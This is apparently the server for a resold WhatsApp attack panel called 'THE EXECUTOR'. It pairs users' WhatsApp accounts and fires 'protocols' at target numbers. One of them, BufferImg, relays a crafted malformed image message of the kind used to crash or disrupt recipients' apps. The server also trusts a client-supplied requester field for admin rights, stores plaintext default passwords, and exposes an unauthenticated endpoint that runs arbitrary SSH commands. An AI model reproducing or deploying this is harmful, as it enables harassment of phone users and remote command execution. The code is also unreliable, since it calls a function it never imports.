const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const config = require('./config');
const { Client } = require('ssh2');

const port = process.env.PORT || process.env.SERVER_PORT || config.WA_SERVER_PORT || 3000;

// Read/write DB helpers for init
const dbPath = path.join(__dirname, 'database.json');
const ownerEnvId = config.OWNER_TELEGRAM_ID ? parseInt(config.OWNER_TELEGRAM_ID, 10) : null;

function readDb() {
  try {
    let db;
    if (!fs.existsSync(dbPath)) {
      db = {
        botConfig: { ownerId: ownerEnvId || 0, resellers: [] },
        users: {},
        history: {}
      };
    } else {
      const data = fs.readFileSync(dbPath, 'utf8');
      db = JSON.parse(data);
    }

    // Sync/ensure owner user exists and is up to date with config credentials
    const ownerName = (config.DEFAULT_OWNER_USERNAME || 'pepet').toLowerCase();
    const ownerPass = config.DEFAULT_OWNER_PASSWORD || '123';
    if (!db.users) db.users = {};
    
    if (!db.users[ownerName]) {
      // Config owner does NOT exist. Let's see if we can migrate from an existing owner.
      const existingOwnerKey = Object.keys(db.users).find(k => db.users[k].status === 'Owner');
      
      if (existingOwnerKey) {
        // Migrate old owner to new owner username to preserve senders & history
        const oldOwnerData = db.users[existingOwnerKey];
        delete db.users[existingOwnerKey];
        
        db.users[ownerName] = {
          ...oldOwnerData,
          username: ownerName,
          password: ownerPass,
          status: 'Owner'
        };
        
        // Also migrate history if exists
        if (db.history) {
          if (!db.history[ownerName]) db.history[ownerName] = [];
          if (db.history[existingOwnerKey]) {
            db.history[ownerName] = db.history[existingOwnerKey];
            delete db.history[existingOwnerKey];
          }
        }
        
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
        console.log(`[DB] Migrated owner account from "${existingOwnerKey}" to "${ownerName}"`);
      } else {
        // If no owner matches and no old owner to migrate, create a new one
        db.users[ownerName] = {
          username: ownerName,
          password: ownerPass,
          status: 'Owner',
          activeUntil: '9999-12-31',
          limit: 9999,
          whatsappSenders: []
        };
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
      }
    } else {
      // Owner already exists! Just sync password if it differs
      if (db.users[ownerName].password !== ownerPass) {
        db.users[ownerName].password = ownerPass;
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
      }
    }

    return db;
  } catch (err) {
    console.error("Error reading database:", err);
    return { botConfig: { ownerId: ownerEnvId || 0, resellers: [] }, users: {}, history: {} };
  }
}

function writeDb(db) {
  try {
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error("Error writing database:", err);
    return false;
  }
}

// WhatsApp Connection Manager
const activeSessions = new Map();

function updateDbSenderStatus(username, number, isLinked) {
  const db = readDb();
  if (db.users && db.users[username] && db.users[username].whatsappSenders) {
    const senders = db.users[username].whatsappSenders;
    const sender = senders.find(s => s.number === number);
    if (sender) {
      sender.linked = isLinked;
      writeDb(db);
    }
  }
}

async function connectWASender(phoneNumber, username) {
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
  if (!cleanNumber) return null;

  if (activeSessions.has(cleanNumber)) {
    const existing = activeSessions.get(cleanNumber);
    if (existing.state === 'ONLINE' || existing.state === 'CONNECTING') {
      return existing;
    }
  }

  console.log(`[WA] Initializing session for ${cleanNumber}...`);
  const sessionDir = path.join(__dirname, 'sessions', cleanNumber);
  
  if (!fs.existsSync(path.join(__dirname, 'sessions'))) {
    fs.mkdirSync(path.join(__dirname, 'sessions'));
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false
  });

  const sessionObj = {
    sock,
    state: 'CONNECTING',
    phoneNumber: cleanNumber,
    username
  };
  activeSessions.set(cleanNumber, sessionObj);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      console.log(`[WA] Connection closed for ${cleanNumber}. Reconnecting: ${shouldReconnect}`);
      
      sessionObj.state = 'OFFLINE';
      
      if (shouldReconnect) {
        setTimeout(() => connectWASender(cleanNumber, username), 5000);
      } else {
        console.log(`[WA] Session logged out for ${cleanNumber}. Cleaning folder...`);
        activeSessions.delete(cleanNumber);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (e) {}
        updateDbSenderStatus(username, cleanNumber, false);
      }
    } else if (connection === 'open') {
      console.log(`[WA] Connected successfully: ${cleanNumber}`);
      sessionObj.state = 'ONLINE';
      updateDbSenderStatus(username, cleanNumber, true);
    }
  });

  return sessionObj;
}

async function initAllSavedWASenders() {
  const db = readDb();
  const users = db.users || {};
  for (const uname in users) {
    const user = users[uname];
    const senders = user.whatsappSenders || [];
    for (const sender of senders) {
      try {
        await connectWASender(sender.number, uname);
      } catch (err) {
        console.error(`Failed to auto-connect ${sender.number}:`, err);
      }
    }
  }
}

const server = express();
server.use(cors());
server.use(express.json());
server.use(express.static(path.join(__dirname, 'public')));

// HTML Page Routes
server.get('/', (req, res) => {
  res.redirect('/dashboard');
});
server.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
server.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});
server.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Initial Data Endpoint for client-side fetching
server.get('/api/dashboard/init', (req, res) => {
  const { username } = req.query;
  const db = readDb();
  
  // Fallback logic: if no username provided, take the first available user in DB
  const usernames = Object.keys(db.users || {});
  const targetUsername = typeof username === 'string' ? username.trim().toLowerCase() : (usernames[0] || '').toLowerCase();
  
  let userKey = targetUsername;
  let user = db.users && targetUsername ? db.users[targetUsername] || null : null;
  if (!user && db.users && targetUsername) {
    const foundKey = Object.keys(db.users).find(k => k.toLowerCase() === targetUsername || db.users[k].username.toLowerCase() === targetUsername);
    if (foundKey) {
      userKey = foundKey;
      user = db.users[foundKey];
    }
  }
  const history = db.history && userKey ? db.history[userKey] || [] : [];
  
  res.json({
    user,
    history,
    queryUsername: username || null,
    credits: config.CREDITS
  });
});

  // Auth endpoints
  server.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    const db = readDb();
    const cleanUsername = username.toLowerCase().trim();
    let user = db.users ? db.users[cleanUsername] : null;
    if (!user && db.users) {
      user = Object.values(db.users).find(u => u.username.toLowerCase() === cleanUsername) || null;
    }
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const dbPassword = user.password || '123';
    if (password !== dbPassword) {
      return res.status(401).json({ error: 'Incorrect password' });
    }
    
    res.json({ success: true, username: user.username, status: user.status });
  });

  // Admin endpoints
  server.get('/api/admin/users', (req, res) => {
    const { requester } = req.query;
    if (!requester) return res.status(400).json({ error: 'Requester required' });
    const db = readDb();
    const cleanRequester = requester.toLowerCase().trim();
    let reqUser = db.users ? db.users[cleanRequester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
    }
    if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
      return res.status(403).json({ error: 'Access denied' });
    }
    res.json({ users: Object.values(db.users || {}) });
  });

  server.post('/api/admin/users', (req, res) => {
    const { requester, username, status, activeUntil, limit, password } = req.body;
    if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
    const db = readDb();
    const cleanRequester = requester.toLowerCase().trim();
    const cleanUsername = username.toLowerCase().trim();
    let reqUser = db.users ? db.users[cleanRequester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
    }
    if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
      return res.status(403).json({ error: 'Access denied' });
    }

    if (!db.users) db.users = {};
    if (!db.users[cleanUsername]) {
      const fallbackPass = Math.random().toString(36).substring(2, 8); // Generate 6-char random password
      db.users[cleanUsername] = {
        username: cleanUsername,
        password: password || fallbackPass,
        status: status || 'User',
        activeUntil: activeUntil || '2026-12-31',
        limit: limit !== undefined ? parseInt(limit, 10) : 10,
        whatsappSenders: []
      };
    } else {
      db.users[cleanUsername].status = status || db.users[cleanUsername].status;
      db.users[cleanUsername].activeUntil = activeUntil || db.users[cleanUsername].activeUntil;
      if (limit !== undefined) db.users[cleanUsername].limit = parseInt(limit, 10);
      if (password !== undefined) db.users[cleanUsername].password = password;
    }

    writeDb(db);
    res.json({ success: true, user: db.users[cleanUsername] });
  });

  server.delete('/api/admin/users', (req, res) => {
    const { requester, username } = req.body;
    if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
    const db = readDb();
    const cleanRequester = requester.toLowerCase().trim();
    const cleanUsername = username.toLowerCase().trim();
    let reqUser = db.users ? db.users[cleanRequester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
    }
    if (!reqUser || reqUser.status !== 'Owner') {
      return res.status(403).json({ error: 'Access denied. Only Owner can delete.' });
    }

    if (db.users && db.users[cleanUsername]) {
      delete db.users[cleanUsername];
      writeDb(db);
      return res.json({ success: true });
    }
    res.status(404).json({ error: 'User not found' });
  });

  // WhatsApp endpoints
  server.get('/api/senders', (req, res) => {
    const { username } = req.query;
    if (!username) return res.status(400).json({ error: 'Username required' });

    const db = readDb();
    let user = db.users ? db.users[username] : null;
    if (!user && db.users) {
      user = Object.values(db.users).find(u => u.username === username) || null;
    }
    if (!user) return res.status(404).json({ error: 'User not found' });

    const senders = user.whatsappSenders || [];
    const detailedSenders = senders.map(s => {
      const active = activeSessions.get(s.number);
      return {
        number: s.number,
        linked: active ? (active.state === 'ONLINE') : false,
        state: active ? active.state : 'OFFLINE',
        connectedAt: s.connectedAt
      };
    });

    res.json({ whatsappSenders: detailedSenders });
  });

  function addSenderToDb(username, number) {
    const db = readDb();
    if (db.users && db.users[username]) {
      const user = db.users[username];
      if (!user.whatsappSenders) user.whatsappSenders = [];
      
      const exists = user.whatsappSenders.some(s => s.number === number);
      if (!exists) {
        user.whatsappSenders.push({
          number,
          linked: false,
          connectedAt: new Date().toISOString().replace('T', ' ').substring(0, 16)
        });
        writeDb(db);
      }
    }
  }

  server.post('/api/pair', async (req, res) => {
    const { username, number } = req.body;
    if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (!cleanNumber) return res.status(400).json({ error: 'Invalid phone number format' });

    try {
      const session = await connectWASender(cleanNumber, username);
      if (!session) return res.status(500).json({ error: 'Failed to initialize session' });

      await delay(3500);

      if (session.sock.authState.creds.registered) {
        addSenderToDb(username, cleanNumber);
        return res.json({ success: true, alreadyLinked: true });
      }

      console.log(`[WA] Requesting pairing code for ${cleanNumber}...`);
      const code = await session.sock.requestPairingCode(cleanNumber);
      console.log(`[WA] Code retrieved: ${code}`);

      addSenderToDb(username, cleanNumber);
      res.json({ success: true, pairingCode: code });
    } catch (err) {
      console.error(`[WA] Error in pairing request:`, err);
      res.status(500).json({ error: err.message || 'Error during pairing request' });
    }
  });

  server.post('/api/disconnect', async (req, res) => {
    const { username, number } = req.body;
    if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

    const cleanNumber = number.replace(/[^0-9]/g, '');
    
    const db = readDb();
    if (db.users && db.users[username] && db.users[username].whatsappSenders) {
      db.users[username].whatsappSenders = db.users[username].whatsappSenders.filter(s => s.number !== cleanNumber);
      writeDb(db);
    }

    const session = activeSessions.get(cleanNumber);
    if (session) {
      try {
        session.sock.logout();
      } catch (e) {}
      activeSessions.delete(cleanNumber);
    }

    const sessionDir = path.join(__dirname, 'sessions', cleanNumber);
    try {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    } catch (e) {}

    res.json({ success: true });
  });

  // Helper Async Functions untuk memproses pengiriman pesan berdasarkan Protokol

  async function BufferImg(sock, jid) {
    const LxP = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "YoOZJFDnvu0JFeQY/9OSAX5/mmGRbowl2nyyH1Pma0Q=",
        fileLength: "179554",
        height: 1271,
        width: 1280,
        mediaKey: "X1wBjPCCvZVntAPBOKhzD4GBi8sP8lqHIRvLCtARiCA=",
        fileEncSha256: "ozfEQ6yWVFYyPVj2cf5TFfXAedks3pTdzxuENKWCLmg=",
        directPath: "/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779202167",
        jpegThumbnail: Buffer.from([0x00]),
        contextInfo: {
          pairedMediaType: "SD_IMAGE_PARENT",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 999,
          externalAdReply: {
            title: "location",
            body: "@FunctionBug telegram ofc",
            mediaType: 1,
            thumbnail: Buffer.from([0x00]),
            sourceUrl: "https://t.me/FunctionBug",
            renderLargerThumbnail: true,
            showAdAttribution: true
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        scansSidecar: "Nft/7Cf7Ti4X3mAsjE6u5ggVEPn60GJJfTGcm8oW/ng9mUcX/uonxQ==",
        scanLengths: [14958, 73513, 41498, 49585],
        midQualityFileSha256: "dOxjsI60hqoFv5mEpdAZmDo19QUVusopbLNdQYtaPfo="
      }
    };

    const msg = generateWAMessageFromContent(sock, jid, LxP, {
      userJid: sock.user.id
    });

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
      participant: jid,
    }).catch(() => {});
  }

  async function sendProtocolAlpha(sock, jid) {
    const messageContent = {
      text: `⚡ *THE EXECUTOR v1.0* ⚡\n\n🔒 *Payload Protocol:* Alpha\n📈 *Status:* Deployed Successfully\n\nDeveloped by @VANNESSWANGSAFF`
    };
    return await sock.sendMessage(jid, messageContent);
  }

  async function sendProtocolBeta(sock, jid) {
    const messageContent = {
      text: `NGETEST AJAH`,
      contextInfo: {
        externalAdReply: {
          title: "THE EXECUTOR",
          body: "This is Only Tester",
          mediaType: 1,
          sourceUrl: "https://t.me/VannessWangsaff",
          renderLargerThumbnail: false
        }
      }
    };
    return await sock.sendMessage(jid, messageContent);
  }

  async function sendProtocolEvent(sock, jid) {
    const messageContent = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: Buffer.alloc(32, 1)
          },
          eventMessage: {
            isCanceled: false,
            name: "THE EXECUTOR EVENT",
            description: "Authorized System Meeting",
            location: {
              degreesLatitude: -6.200000, 
              degreesLongitude: 106.816666, 
              name: "Virtual Node Room",
              address: "Online Gateway"
            },
            extraGuestsAllowed: true,
            hasReminder: true,
            reminderOffsetSec: 3600,
            joinLink: "https://call.whatsapp.com/video/example-meeting",
            startTime: Math.floor(Date.now() / 1000) + 3600,
            endTime: null
          }
        }
      }
    };
    return await sock.relayMessage(jid, messageContent, { messageId: null });
  }

  // ── DAFTAR PROTOKOL (REGISTRY) ──
  const protocolHandlers = {
    'A': sendProtocolAlpha,
    'B': sendProtocolBeta,
    'C': sendProtocolEvent,
    'D': BufferImg,
  };

  server.post('/api/send', async (req, res) => {
    const { username, senderNumber, targetNumber, protocol } = req.body;
    if (!username || !targetNumber) {
      return res.status(400).json({ error: 'Missing parameters' });
    }

    let activeSenderNum = senderNumber ? senderNumber.replace(/[^0-9]/g, '') : null;
    
    if (!activeSenderNum) {
      const db = readDb();
      const user = db.users ? db.users[username] : null;
      const senders = user ? user.whatsappSenders || [] : [];
      const onlineSender = senders.find(s => {
        const active = activeSessions.get(s.number);
        return active && active.state === 'ONLINE';
      });
      if (onlineSender) {
        activeSenderNum = onlineSender.number;
      }
    }

    if (!activeSenderNum) {
      return res.status(400).json({ error: 'No active online WhatsApp sender found.' });
    }

    const session = activeSessions.get(activeSenderNum);
    if (!session || session.state !== 'ONLINE') {
      return res.status(400).json({ error: `Sender ${activeSenderNum} is not currently ONLINE.` });
    }

    try {
      const cleanTarget = targetNumber.replace(/[^0-9]/g, '');
      const jid = `${cleanTarget}@s.whatsapp.net`;
      
      console.log(`[WA] Memproses pengiriman dari ${activeSenderNum} ke ${jid} menggunakan Protocol: ${protocol}...`);

      const handler = protocolHandlers[protocol] || protocolHandlers['A'];
      let logPayload = `Protocol ${protocol || 'A'}`;

      if (protocol === 'B') {
        logPayload = 'Protocol Beta (Ad Reply)';
      } else if (protocol === 'C') {
        logPayload = 'Protocol Charlie (Event)';
      } else {
        logPayload = 'Protocol Alpha (Text)';
      }

      await handler(session.sock, jid);
      
      addHistoryRecord(username, activeSenderNum, cleanTarget, logPayload, 'Success');
      res.json({ success: true, senderUsed: activeSenderNum });
    } catch (err) {
      console.error(`[WA] Send message error:`, err);
      addHistoryRecord(username, activeSenderNum, targetNumber, `Failed: ${protocol || 'Alpha'}`, 'Failed');
      res.status(500).json({ error: err.message || 'Failed to send message' });
    }
  });

  function addHistoryRecord(username, sender, target, payload, status) {
    const db = readDb();
    if (!db.history) db.history = {};
    if (!db.history[username]) db.history[username] = [];

    const newId = db.history[username].length > 0 
      ? Math.max(...db.history[username].map(h => h.id)) + 1 
      : 1;

    db.history[username].push({
      id: newId,
      date: new Date().toISOString().replace('T', ' ').substring(0, 19),
      target: target,
      payload: `WA Sender: ${sender} | Msg: ${payload}`,
      status: status
    });

    writeDb(db);
  }

  // SSH2 VPS Installation Stream Route
  server.post('/api/tools/execute-ssh', (req, res) => {
    const { ip, port, username, password, command } = req.body;
    if (!ip || !username || !password || !command) {
      return res.status(400).json({ error: 'Missing parameters. VPS IP, username, password and command are required.' });
    }

    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Transfer-Encoding', 'chunked');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    const sendLog = (text) => {
      res.write(text + '\n');
    };

    sendLog(`📡 Connecting to VPS at ${ip}:${port || 22} as ${username}...`);

    const conn = new Client();
    
    conn.on('ready', () => {
      sendLog('✔ SSH connection established successfully!');
      sendLog(`$ Running command: ${command}`);
      
      conn.exec(command, (err, stream) => {
        if (err) {
          sendLog(`✖ Execution error: ${err.message}`);
          conn.end();
          res.end();
          return;
        }

        stream.on('close', (code, signal) => {
          sendLog(`✔ Process exited with code ${code}`);
          conn.end();
          res.end();
        }).on('data', (data) => {
          res.write(data.toString());
        }).stderr.on('data', (data) => {
          res.write(`[ERROR] ${data.toString()}`);
        });
      });
    }).on('error', (err) => {
      sendLog(`✖ SSH connection failed: ${err.message}`);
      res.end();
    }).connect({
      host: ip,
      port: parseInt(port || 22, 10),
      username: username,
      password: password,
      readyTimeout: 15000
    });

    req.on('close', () => {
      console.log('[SSH] Client disconnected. Closing SSH connection...');
      try {
        conn.end();
      } catch (e) {}
    });
  });

  // Global Chat Endpoints
  server.get('/api/chat', (req, res) => {
    const db = readDb();
    const chats = db.chats || [];
    res.json({ chats });
  });

  server.post('/api/chat', (req, res) => {
    const { username, message } = req.body;
    if (!username || !message) {
      return res.status(400).json({ error: 'Username and message are required.' });
    }

    const db = readDb();
    if (!db.chats) db.chats = [];

    // Find role/status of user
    let status = 'User';
    if (db.users && db.users[username]) {
      status = db.users[username].status || 'User';
    }

    const newChat = {
      username: username.trim(),
      status: status,
      message: message.trim(),
      date: new Date().toISOString().replace('T', ' ').substring(0, 19)
    };

    db.chats.push(newChat);

    // Keep only last 50 chats to prevent database bloating
    if (db.chats.length > 50) {
      db.chats.shift();
    }

    writeDb(db);
    res.json({ success: true, chat: newChat });
  });

  server.listen(port, (err) => {
    if (err) throw err;
    console.log(`📡 Unified Express Server & WhatsApp API is running on port ${port}`);
    
    // START TELEGRAM BOT in the same process
    try {
      require('./bot.js');
    } catch (err) {
      console.error("Error loading Telegram Bot:", err);
    }

    // AUTO-CONNECT SENDERS
    initAllSavedWASenders();
  });
